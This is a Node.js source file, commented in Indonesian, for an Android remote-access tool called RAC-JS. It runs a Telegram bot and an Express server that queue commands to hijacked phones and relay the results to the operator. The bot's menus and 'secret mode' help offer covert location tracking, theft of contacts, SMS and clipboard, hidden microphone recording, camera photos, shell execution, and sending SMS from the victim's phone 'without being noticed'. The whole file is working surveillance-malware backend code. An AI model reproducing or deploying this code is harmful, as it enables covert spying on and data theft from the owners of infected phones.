require('dotenv').config();
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');

// --- KONFIGURASI ---
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'my-secret-token';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const PORT = process.env.PORT || 3000;

const app = express();

// --- DATABASE SETUP ---
let db;
(async () => {
    const pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false }
    });

    // Wrapper agar spesifikasi DML SQLite yang ada tidak error menggunakan sintaks PostgreSQL ($1)
    db = {
        exec: async (query) => {
            query = query.replace(/INTEGER PRIMARY KEY AUTOINCREMENT/g, 'SERIAL PRIMARY KEY');
            query = query.replace(/DATETIME/g, 'TIMESTAMP');
            query = query.replace(/REAL/g, 'DOUBLE PRECISION');
            return pool.query(query);
        },
        run: async (query, params = []) => {
            if (query.includes('INSERT OR REPLACE INTO devices')) {
                query = 'INSERT INTO devices (id, last_seen) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET last_seen = EXCLUDED.last_seen';
            } else {
                let i = 1;
                query = query.replace(/\?/g, () => `$${i++}`);
            }
            return pool.query(query, params);
        },
        get: async (query, params = []) => {
            let i = 1;
            query = query.replace(/\?/g, () => `$${i++}`);
            const res = await pool.query(query, params);
            return res.rows[0];
        },
        all: async (query, params = []) => {
            let i = 1;
            query = query.replace(/\?/g, () => `$${i++}`);
            const res = await pool.query(query, params);
            return res.rows;
        }
    };

    // Buat Tabel jika belum ada
    await db.exec(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY, 
        last_seen REAL DEFAULT 0,
        info TEXT
    )`);

    await db.exec(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        text TEXT,
        status TEXT DEFAULT 'pending',
        chat_id TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Tambah kolom jika dari versi sebelumnya belum ada
    try {
        await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`);
    } catch (e) {
        // Ignored if already exists
    }

    await db.exec(`CREATE TABLE IF NOT EXISTS system_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command_id TEXT,
        level TEXT DEFAULT 'INFO',
        message TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
})();

// --- MIDDLEWARE ---
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'templates'));

// Helper function
const updateDeviceSeen = async (deviceId) => {
    const timestamp = Date.now() / 1000;
    await db.run('INSERT OR REPLACE INTO devices (id, last_seen) VALUES (?, ?)', [deviceId, timestamp]);
};

// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
const escapeHTML = (str) => String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const formatDeviceResponse = (data) => {
    if (typeof data === 'string') return `\n└ ${escapeHTML(data)}`;
    if (Array.isArray(data)) {
        if (data.length === 0) return '\n└ [Data Kosong]';
        return '\n' + data.map((item, idx) => `  ${idx + 1}. ` + (typeof item === 'object' && item !== null ? Object.entries(item).map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`).join(' | ') : escapeHTML(item))).join('\n');
    }
    if (typeof data === 'object' && data !== null) {
        return '\n' + Object.entries(data).map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`).join('\n');
    }
    return `\n└ ${escapeHTML(data)}`;
};

// --- TELEGRAM BOT ---
let bot;
if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
    bot = new Telegraf(TELEGRAM_TOKEN);

    // Mendaftarkan perintah ke dalam kotak input Telegram
    bot.telegram.setMyCommands([
        { command: 'start', description: 'Lihat menu utama bot' },
        { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
        { command: 'help', description: 'Bantuan & Daftar Perintah Rahasia' },
        { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
    ]);

    const sendHelpMessage = (ctx) => {
        const helpText = `
📖 <b>Daftar Perintah RAC-JS</b>

<b>1. Mode Interaktif (Satu Klik)</b>
Cukup ketik /list, pilih perangkat, dan tekan tombol:
📡 Ping | 🎯 Lokasi | 🔋 Baterai | 🔦 Torch 
📞 Kontak | 📩 Inbox SMS | 🔊 Record Audio
📻 Info Volume | 🌐 WiFi Scan | 📋 Clipboard
ℹ️ Info Sistem | ⚙️ Sensor

<b>2. Mode Rahasia (Manual)</b>
Harus diketik dengan format: 
<code>/cmd [id_device] [nama_perintah] [teks_opsional]</code>

• <b>show_toast</b> : Memunculkan popup teks di layar target
• <b>shell</b> : Mengeksekusi perintah terminal Linux/Android
• <b>set_volume</b> : Mengatur volume (music/ring/alarm/notification) [angka]
• <b>tts</b> : Berbicara text-to-speech menirukan suara robot
• <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
• <b>sms_send</b> : Mengirim SMS dari HP target tanpa ketahuan (Format: <code>Nomor|Pesan</code>)
• <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi dari URL web
• <b>record_sound</b> : Merekam mikrofon (Format: argumen dalam mili-detik, cth <code>5000</code>)
`;
        ctx.reply(helpText, { parse_mode: 'HTML' });
    };

    bot.command('help', sendHelpMessage);
    bot.action('btn_help', async (ctx) => {
        ctx.answerCbQuery();
        sendHelpMessage(ctx);
    });

    bot.start((ctx) => {
        const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
        ctx.reply(msg, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')],
                [Markup.button.callback('📖 Bantuan & Dokumentasi', 'btn_help')]
            ])
        });
    });

    bot.command('list', async (ctx) => listDevicesToChat(ctx));
    bot.action('btn_list', async (ctx) => {
        ctx.answerCbQuery();
        listDevicesToChat(ctx);
    });

    const listDevicesToChat = async (ctx) => {
        const devices = await db.all('SELECT * FROM devices');
        if (devices.length === 0) return ctx.reply('📭 Belum ada perangkat yang terhubung ke server.');

        const buttons = [];
        devices.forEach(d => {
            const isOnline = (Date.now() / 1000 - d.last_seen) < 60;
            const statusIcon = isOnline ? '🟢' : '🔴';
            buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev:${d.id}`)]);
        });

        ctx.reply('📱 <b>Pilih Target Perangkat:</b>', {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard(buttons)
        });
    };

    // Menangani klik dari tombol Device yang dipilih
    bot.action(/^select_dev:(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        ctx.answerCbQuery();

        const menuBtns = [
            [Markup.button.callback('📡 Ping', `runcmd:${devId}:ping`), Markup.button.callback('🎯 Lokasi', `runcmd:${devId}:location`)],
            [Markup.button.callback('🔋 Baterai', `runcmd:${devId}:get_battery`), Markup.button.callback('🔦 Torch', `runcmd:${devId}:torch`)],
            [Markup.button.callback('📞 Kontak', `runcmd:${devId}:contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd:${devId}:sms_list`)],
            [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
            [Markup.button.callback('📷 Foto (Belakang)', `runcmd:${devId}:photo back`), Markup.button.callback('🤳 Foto (Depan)', `runcmd:${devId}:photo front`)],
            [Markup.button.callback('🌐 WiFi Scan', `runcmd:${devId}:wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)],
            [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)]
        ];

        ctx.reply(`🎯 <b>Perangkat Terpilih:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard(menuBtns)
        });
    });

    // Menangani klik perintah spesifik dari device
    bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        const fullCmd = ctx.match[2];
        const parts = fullCmd.split(' ');
        const cmdName = parts[0];
        const cmdText = parts.slice(1).join(' ');

        ctx.answerCbQuery(`Menjalankan ${cmdName}...`);

        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.callbackQuery.message.chat.id.toString();

        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
            [cmdId, devId, cmdName, cmdText, 'pending', chatId]);

        ctx.reply(`⏳ <b>[${cmdName}]</b> masuk ke antrean untuk <code>${devId}</code>...`, { parse_mode: 'HTML' });
    });

    bot.command('cmd', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) return ctx.reply('Gunakan mode manual 🛠️:\n/cmd [id_device] [nama_perintah] [teks_opsional]');

        const devId = args[1];
        const cmdName = args[2];
        const extraText = args.slice(3).join(' ');

        // Validasi Device ID
        const check = await db.get('SELECT id FROM devices WHERE id = ?', [devId]);
        if (!check) return ctx.reply(`❌ Perangkat <code>${devId}</code> tidak ditemukan di dalam database.`, { parse_mode: 'HTML' });

        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.chat.id.toString();

        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
            [cmdId, devId, cmdName, extraText, 'pending', chatId]);

        ctx.reply(`🗃️ <b>Manual Queued:</b> ${cmdName} ➡️ <code>${devId}</code>`, { parse_mode: 'HTML' });
    });

    if (WEBHOOK_URL) {
        // Baris ini akan memastikan webhook terdaftar ke Telegram
        bot.telegram.setWebhook(`${WEBHOOK_URL}`).then(() => {
            console.log(`Webhook set successfully to: ${WEBHOOK_URL}`);
        }).catch(err => {
            console.error('Failed to set webhook:', err);
        });
    }
}

// --- EXPRESS ENDPOINTS ---
app.get('/', (req, res) => {
    res.json({ status: 'running', engine: 'Node.js Express', database: 'SQLite' });
});

app.post('/webhook', (req, res) => {
    if (bot) {
        bot.handleUpdate(req.body, res);
    } else {
        res.status(200).send('Bot not configured');
    }
});

app.get('/poll', async (req, res) => {
    const { client_id, auth } = req.query;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });

    await updateDeviceSeen(client_id);

    const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
        [client_id, 'pending']);

    if (cmd) {
        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
    }

    res.json({ command: 'none' });
});

app.post('/response', async (req, res) => {
    const { client_id, auth } = req.query;
    const data = req.body;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });

    await updateDeviceSeen(client_id);

    await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)',
        [client_id, data.id || null, data.level || 'INFO', JSON.stringify(data)]);

    if (data.id) {
        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['completed', data.id]);

        // Membalas ke Telegram jika perintah ini dari Telegram
        try {
            const cmd = await db.get('SELECT chat_id FROM commands WHERE id = ?', [data.id]);
            if (cmd && cmd.chat_id && bot) {
                const deviceResponse = data.data !== undefined ? data.data : data;

                if (data.type === 'audio_base64') {
                    const audioBuffer = Buffer.from(deviceResponse, 'base64');
                    await bot.telegram.sendAudio(cmd.chat_id, {
                        source: audioBuffer,
                        filename: `record_${data.id}.3gp`
                    }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
                    return res.json({ status: 'received' });
                }

                if (data.type === 'photo_base64') {
                    const imageBuffer = Buffer.from(deviceResponse, 'base64');
                    await bot.telegram.sendPhoto(cmd.chat_id, {
                        source: imageBuffer
                    }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
                    return res.json({ status: 'received' });
                }

                const jsonString = JSON.stringify(deviceResponse, null, 2);

                // Jika ukuran pesan melebihi limit Telegram (4096 char), kirim sebagai file JSON
                if (jsonString.length > 3500) {
                    const buffer = Buffer.from(jsonString, 'utf-8');
                    await bot.telegram.sendDocument(cmd.chat_id, {
                        source: buffer,
                        filename: `response_${data.id}.json`
                    }, { caption: `✅ <b>Respon dari alat (${escapeHTML(client_id)}):</b> Payload terlalu besar, dikirim sebagai file.`, parse_mode: 'HTML' });
                } else {
                    const formattedDisplay = formatDeviceResponse(deviceResponse);
                    const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
                    await bot.telegram.sendMessage(cmd.chat_id, replyMessage, { parse_mode: 'HTML' });
                }
            }
        } catch (err) {
            console.error('Gagal mengirim balasan ke Telegram:', err);
        }
    }

    res.json({ status: 'received' });
});

// --- ADMIN PANEL ---
const verifyAdmin = (req) => req.cookies.admin_auth === ADMIN_PASSWORD;

app.get('/admin', (req, res) => {
    if (!verifyAdmin(req)) return res.render('login');
    res.render('index');
});

app.post('/admin/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie('admin_auth', req.body.password, { maxAge: 86400000, httpOnly: true });
        return res.redirect('/admin');
    }
    res.redirect('/admin');
});

app.post('/admin/logout', (req, res) => {
    res.clearCookie('admin_auth');
    res.redirect('/admin');
});

app.get('/admin/api/devices', async (req, res) => {
    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const devices = await db.all('SELECT * FROM devices');
    const now = Date.now() / 1000;

    const devicesData = devices.map(d => ({
        id: d.id,
        last_seen: d.last_seen,
        is_online: (now - d.last_seen) < 60
    }));
    res.json({ devices: devicesData });
});

app.get('/admin/api/logs', async (req, res) => {
    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const logs = await db.all('SELECT * FROM system_logs ORDER BY created_at DESC LIMIT 50');
    res.json({ logs });
});

app.post('/admin/api/command', async (req, res) => {
    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { device_id, command, text } = req.body;
    const cmdId = uuidv4().slice(0, 8);
    await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
        [cmdId, device_id, command, text || '', 'pending']);
    res.json({ status: 'success', command_id: cmdId });
});

app.delete('/admin/api/device/:id', async (req, res) => {
    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const devId = req.params.id;
    await db.run('DELETE FROM commands WHERE device_id = ?', [devId]);
    await db.run('DELETE FROM system_logs WHERE device_id = ?', [devId]);
    await db.run('DELETE FROM devices WHERE id = ?', [devId]);
    res.json({ status: 'success', message: 'Perangkat berhasil dibersihkan dari registry.' });
});

app.delete('/admin/api/logs', async (req, res) => {
    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const filterDays = parseInt(req.query.days) || 0;

    if (filterDays === 0) {
        await db.run('DELETE FROM system_logs');
    } else {
        // Syntax PostgreSQL untuk pengurangan waktu
        await db.run(`DELETE FROM system_logs WHERE created_at < NOW() - INTERVAL '${filterDays} days'`);
    }
    res.json({ status: 'success', message: 'Log sistem berhasil dibersihkan.' });
});

app.listen(PORT, () => {
    console.log(`Server Node.js berjalan di port ${PORT}`);
});
